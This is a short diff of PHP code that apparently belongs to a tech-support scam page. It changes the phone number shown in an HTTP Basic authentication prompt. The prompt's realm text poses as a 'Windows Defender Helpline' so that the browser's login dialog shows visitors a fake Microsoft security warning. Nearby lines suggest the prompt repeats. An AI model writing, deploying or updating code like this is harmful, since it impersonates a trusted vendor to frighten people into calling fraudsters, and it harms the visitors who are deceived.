@@ -14,7 +14,7 @@
             exit;
         } else {
 
-          header('WWW-Authenticate: Basic realm="Windows Defender Helpline +1-888-888-8888  (Security Helpline)  "');
+          header('WWW-Authenticate: Basic realm="Windows Defender Helpline +1-808-215-3446  (Security Helpline)  "');
            header('HTTP/1.0 401 Unauthorized');
 $page = $_SERVER['PHP_SELF'];
  $sec = "0";
